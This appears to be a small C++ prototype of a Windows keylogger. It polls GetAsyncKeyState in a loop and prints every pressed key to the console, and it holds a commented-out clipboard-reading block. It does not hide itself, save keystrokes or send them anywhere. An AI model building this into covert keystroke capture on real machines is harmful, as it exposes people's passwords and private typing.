// logger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "logger.h"
#include <iostream>
using namespace std;

int main()
{
	micro1337::KeyListener* log = micro1337::KeyListener::instance();
	while (1) {
		/*
		if (log->isCPressed() && log->isCtrlPressed()) {	
			auto activeWindow = GetForegroundWindow();
			OpenClipboard(activeWindow);
			HANDLE clipboard = GetClipboardData(CF_TEXT);			
			char* clipboardData = (char *)GlobalLock(clipboard);
			

			EmptyClipboard();
			SetClipboardData(CF_TEXT, clipboardData);

			GlobalUnlock(clipboardData);
			

			CloseClipboard();
		}
		Sleep(5);
		*/
		for (auto i = 0; i <= 255; i++) {
			const SHORT key_state = GetAsyncKeyState(i);
			const SHORT MSB = key_state >> 15;
			const SHORT LSB = key_state << 15;
			
			if (MSB != 0) { // get the most significant bit
				//MSB is not zero (-1 usually). Key is pressed	
				if (LSB != 0) // bad to rely on this
				{

					cout << (char)i;
			}
				
			}
			else if (MSB == 0) {
				//cout << i;
				//cout << "Key state: not pressed" << key_state << '\n';
			}
			
		}
		
	}
	getchar();
    return 0;
}

